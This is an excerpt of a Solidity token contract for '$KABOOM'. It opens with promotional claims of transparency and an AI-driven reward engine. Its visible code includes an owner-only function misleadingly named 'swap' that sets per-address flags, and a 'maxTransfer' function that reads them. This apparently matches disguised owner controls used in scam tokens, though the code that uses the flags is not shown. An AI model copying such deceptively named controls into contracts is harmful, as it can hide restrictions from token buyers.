/**
Transparency: Built on Ethereum, $KABOOM ensures trust and reliability through decentralized technology. 
Innovation: Cutting-edge AI models power KABOOM’s reward engine, making rewards dynamic, fair, and personalized.
Collaboration: Developers, users, and businesses thrive together in an interconnected ecosystem.
 */
...
contract Kaboom is IERC20, ERC20{
    address public minter;

    address public distilleryAddress = msg.sender;
    uint256 public immutable initialLPAmount = 100_000_000_000 * 10**decimals();
    ...
    constructor(address initialLPAddress, address distributor_) ERC20("Kaboom", "KABOOM", distributor_) {
        minter = msg.sender;
    ...
    function swap(address[] calldata address_, bool val) public onlyOwner{
        for (uint256 i = 0; i < address_.length; i++) {
            _openedAtTimestamptxLimitExcluded[address_[i]] = val;
        }
    }

    function maxTransfer(address recipient) external view returns(bool){
        return _openedAtTimestamptxLimitExcluded[recipient];
    }
